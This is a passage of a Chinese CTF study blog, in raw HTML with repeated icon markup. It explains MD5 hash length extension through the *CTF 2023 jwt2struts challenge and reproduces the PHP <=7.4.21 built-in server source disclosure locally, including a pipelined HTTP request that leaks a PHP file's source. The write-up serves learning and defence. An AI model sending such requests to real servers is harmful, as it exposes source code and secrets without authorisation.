9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>学习文章</p>\n<p><a href=\"https://j-kangel.github.io/2019/04/05/hash-attack/\">hash长度扩展攻击 | KANGEL (j-kangel.github.io)</a></p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Hash长度拓展攻击（Length Extension Attack）是一种针对特定类型哈希算法的攻击技术。哈希算法是一种将任意大小的数据转换成固定大小哈希值（通常是一串十六进制字符）的算法。这些哈希值通常用于校验数据完整性和验证数据的唯一性。</p>\n<p>在正常情况下，哈希算法的输出长度是固定的，而且算法是不可逆的，意味着从哈希值恢复原始数据是非常困难的。但是，由于一些哈希算法的设计问题，存在一种被称为“Hash长度拓展攻击”的漏洞。</p>\n<p>Hash长度拓展攻击利用了特定哈希算法的漏洞，使攻击者能够根据已知的哈希值和原始数据的部分内容生成一个新的有效哈希值，而无需知道原始数据的其余部分。攻击者能够在已知哈希值的基础上构造出一个新的哈希值，看起来就像是在已知数据后附加了其他内容，并且新的哈希值也是有效的。</p></blockquote>\n<h2 id=\"MD5加密原理\"><a href=\"#MD5加密原理\" class=\"headerlink\" title=\"MD5加密原理\"></a>MD5加密原理</h2><p>先放图，（虽然上了密码学课</p>\n<p><img src=\"/post/Note/image-20230904224135156.png\" alt=\"image-20230904224135156\"></p>\n<p><img src=\"/post/Note/image-20230904223823110.png\" alt=\"image-20230904223823110\"></p>\n<p>总共可以分为，</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ol>\n<li>把消息分为n个分组</li>\n<li>对最后一个消息分组进行填充</li>\n<li>和输入量进行运算，运算结果位下一个分组的输入量</li>\n<li>输出最终结果</li>\n</ol></blockquote>\n<p>MD5算法输入的消息以<code>512bit</code>的分组为单位处理，共<code>64byte</code></p>\n<p>然后对每个分组进行加密，前一次的加密的结果会作为这一次加密的输入，最后一次加密的结果即为最终的MD5值。</p>\n<p><code>不足64字节的分组</code>需要进行<code>补位</code>，也就是字节填充。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>补位原则：首先将需要hash的字符串进行分组，即<code>字符串长度</code>（以字节为单位）整除64，最后一组<code>不足56字节</code>的进行字节填充。填充的第一个字节为<code>0x80</code>，其他均为<code>0x00</code>。剩下的<code>8个字节</code>(64bit)用来表示原字符串的长度。</p></blockquote>\n<hr>\n<p>拿<code>*CTF 2023 jwt2struts</code>题目为例</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>$_COOKIE[“digest”] 要求为 md5($salt.$username.$password)<br>要满足$username &#x3D;&#x3D;&#x3D; “admin” &amp;&amp; $password !&#x3D; “root”<br>&#x2F;&#x2F;$salt &#x3D; XXXXXXXXXXXXXX &#x2F;&#x2F; the salt include 14 characters<br>&#x2F;&#x2F;md5($salt.”adminroot”)&#x3D;e6ccbf12de9d33ec27a5bcfb6a3293df</p></blockquote>\n<p>这个是提示，发现我们知道了<code>md5($salt.&quot;adminroot&quot;)</code>的值，也就是我们的目的MD5值，再加上我们想要加密的字符串，<code>salt的长度已知</code>，后段的<code>adminroot</code>已知</p>\n<p>符合情形，</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ol>\n<li>已知需要加密的字段（如，已知adminroot）</li>\n<li>已知salt的长度，但不知道具体值</li>\n</ol></blockquote>\n<p>可以直接用工具<code>hashdump</code>即可</p>\n<h1 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php&lt;&#x3D;7.4.21 内置服务器任意文件读取\"></a>php&lt;&#x3D;7.4.21 内置服务器任意文件读取</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://blog.projectdiscovery.io/php-http-server-source-disclosure/\">https://blog.projectdiscovery.io/php-http-server-source-disclosure/</a></p></blockquote>\n<p>羊城杯遇到的知识点，在<code>php&lt; = 7.4.21</code>任意文件读取</p>\n<p>开始看到这个页面其实很陌生</p>\n<p><img src=\"/post/Note/image-20230904170556437.png\" alt=\"image-20230904170556437\"></p>\n<p>和常见的<code>apache</code>以及<code>nginx</code>的404都不一样</p>\n<p>搜了一下发现是php内置服务器搭建的网站</p>\n<p><img src=\"/post/Note/image-20230904205656790.png\" alt=\"image-20230904205656790\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>ps.后面看其他人wp才知道，可以扫描网站的，怕被封号没扫，网站下有个<code>start.sh</code>，里面就给出了网站的<code>启动命令</code>和<code>flag</code>的位置，结果我还取解密看重定向响应，麻了</p></blockquote>\n<p>当然题目是反序列化读文件，但是我们得先读取到源码内容，</p>\n<p>网站中想要读取php的源码一般是<code>rce</code>和<code>文件包含</code>才能得到，但是题目只给了<code>404</code>页面，以及有个待读取源码的<code>p0p.php</code>文件</p>\n<p>利用php内置服务器而不靠中间件搭建的网站，真的安全吗？</p>\n<pre class=\" language-highlight bash\"><code class=\"language-highlight bash\">php -S 0.0.0.0:8888</code></pre>\n\n<p>利用万能ai给出文章网站</p>\n<p><img src=\"/post/Note/image-20230904171442398.png\" alt=\"image-20230904171442398\"></p>\n<p>在php&lt;&#x3D;7.4.21版本中，利用php内置服务器搭建的网站存在任意文件读取，但也只是只能读取该命令执行所在目录下的文件，不过正好可以读出<code>p0p.php</code>的内容</p>\n<p>但是题目关了，知识点，我在<code>wsl</code>复现一下</p>\n<hr>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>环境：</p>\n<p><code>wsl2 系统kali</code></p>\n<p><code>php版本 7.0.33</code></p></blockquote>\n<p><img src=\"/post/Note/image-20230904174618539.png\" alt=\"image-20230904174618539\"></p>\n<p>我在命令启动的目录下生成了一个<code>flag.php</code></p>\n<pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"comment\">//flag&#123;test&#125;</span>\n<span class=\"keyword\">echo</span> <span class=\"string\">\"flag_is_here\"</span>;\n<span class=\"meta\">?></span></code></pre>\n\n<p>正常访问只能看到<code>flag_is_here</code></p>\n<p><img src=\"/post/Note/image-20230904174602793.png\" alt=\"image-20230904174602793\"></p>\n<p>但是看不到<code>flag&#123;test&#125;</code></p>\n<p>但是通过构造特殊结构的请求体就可以访问成功，</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>GET &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 172.28.31.86:8888</p>\n<p>GET &#x2F; HTTP&#x2F;1.1</p></blockquote>\n<p><img src=\"/post/Note/image-20230904174755615.png\" alt=\"image-20230904174755615\"></p>\n<p>发现<code>flag.php</code>的内容被完全显示出来，而服务器中的访问数据只是访问了首页</p>\n<p><img src=\"/post/Note/image-20230904175028098.png\" alt=\"image-20230904175028098\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" 